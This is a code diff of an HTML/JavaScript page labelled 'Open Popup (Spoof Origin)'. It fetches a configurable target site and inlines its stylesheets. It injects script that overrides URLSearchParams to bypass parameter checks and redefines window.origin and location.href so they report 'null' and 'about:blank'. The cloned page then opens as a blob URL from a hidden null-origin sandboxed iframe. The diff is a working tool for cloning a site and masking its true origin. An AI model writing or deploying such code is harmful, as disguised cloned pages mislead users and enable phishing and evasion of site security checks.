@@ -11,7 +11,7 @@
     </style>
   </head>
   <body>
-    <button onclick="openSpoofedPopup()">Open Popup (Spoof Origin)</button>
+    <button onclick="openSpoofedPopup()">Open Popup (Spoof Origin) v2</button>
     <script>
       async function fetchAndInlineResources(baseUrl, html) {
         const parser = new DOMParser();
@@ -20,7 +20,11 @@
         // Inline stylesheets
         const styleLinks = doc.querySelectorAll('link[rel="stylesheet"]');
         for (const link of styleLinks) {
-          const href = new URL(link.href, baseUrl).href;
+          let href = new URL(link.href, baseUrl).href;
+          // Try both path variants for github.css bullshit
+          if (href.includes('third-party') && !href.includes('third_party')) {
+            href = href.replace('third-party', 'third_party');
+          }
           try {
             const response = await fetch(href);
             if (response.ok) {
@@ -28,6 +32,8 @@
               const style = doc.createElement('style');
               style.textContent = css;
               link.replaceWith(style);
+            } else {
+              console.warn(`Skipped inlining ${href}: ${response.status}`);
             }
           } catch (e) {
             console.warn(`Failed to inline stylesheet ${href}: ${e}`);
@@ -57,18 +63,21 @@
       async function openSpoofedPopup() {
         const targetUrl = "https://permission.site"; // ganti sesuai kebutuhan
         let html;
+        let finalBaseUrl;
         try {
           const response = await fetch(targetUrl);
           if (!response.ok) throw new Error(`HTTP ${response.status}`);
           html = await response.text();
+          finalBaseUrl = response.url; // Handle redirects
           
           // Inline all resources
-          html = await fetchAndInlineResources(targetUrl, html);
+          html = await fetchAndInlineResources(finalBaseUrl, html);
           
           // Hack to bypass URL param checks
           html = html.replace(
             /<head>/i,
             `<head>
+              <title>about:blank</title>
               <script>
                 const originalURLSearchParams = URLSearchParams;
                 URLSearchParams = function(...args) {
@@ -80,6 +89,9 @@
                 window.addEventListener('load', () => {
                   if (typeof initialize === 'function') initialize();
                 });
+                // Spoof origin/URL for JS visibility
+                Object.defineProperty(window, 'origin', { get: () => 'null', configurable: true });
+                Object.defineProperty(location, 'href', { get: () => 'about:blank', configurable: true });
               <\/script>`
           );
           
@@ -95,49 +107,46 @@
           console.log("✅ Fetched and prepped HTML");
         } catch (error) {
           console.warn("⚠️ Fetch gagal:", error.message);
-          // Fallback: No HTML prep, use direct src in popup
           html = null;
         }
 
-        // Create null-origin sandboxed iframe to open popup from
+        // Create null-origin sandboxed iframe to create blob and open from null context
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         document.body.appendChild(iframe);
-        iframe.sandbox = 'allow-scripts allow-popups'; // Null origin, allow open popup
+        iframe.sandbox = 'allow-scripts allow-popups'; // Null origin
 
-        // Srcdoc with script to receive HTML via postMessage and inject into popup
+        // Srcdoc with script to receive HTML, create blob, open blob URL
         iframe.srcdoc = `
           <script>
             window.addEventListener('message', (event) => {
               if (event.data.type === 'injectHtml') {
-                const win = window.open(
-                  'about:blank',
-                  '_blank',
-                  'width=800,height=600,left=200,top=100,resizable=yes,scrollbars=yes'
-                );
-                if (!win) {
-                  console.error('Popup blocked');
-                  return;
-                }
                 if (event.data.html) {
-                  // Inject fetched HTML
-                  win.document.open();
-                  win.document.write(event.data.html);
-                  win.document.close();
+                  const blob = new Blob([event.data.html], {type: 'text/html'});
+                  const url = URL.createObjectURL(blob);
+                  const win = window.open(
+                    url,
+                    '_blank',
+                    'width=800,height=600,left=200,top=100,resizable=yes,scrollbars=yes'
+                  );
+                  if (!win) {
+                    console.error('Popup blocked');
+                    return;
+                  }
+                  console.log('✅ Popup opened with null-origin blob URL');
                 } else {
-                  // Fallback: Redirect to targetUrl
-                  win.location.href = '${targetUrl}';
+                  // Fallback: Open direct URL (leaks target origin)
+                  window.open('${targetUrl}', '_blank', 'width=800,height=600,left=200,top=100,resizable=yes,scrollbars=yes');
                 }
-                console.log('✅ Popup opened from null-origin iframe with spoofed origin');
               }
             });
           <\/script>
         `;
 
-        // Wait for iframe load, then postMessage the HTML
+        // Wait for iframe load, postMessage the HTML
         iframe.onload = () => {
           iframe.contentWindow.postMessage({ type: 'injectHtml', html }, '*');
-          // Clean up iframe after
+          // Clean up
           setTimeout(() => document.body.removeChild(iframe), 1000);
         };
       }
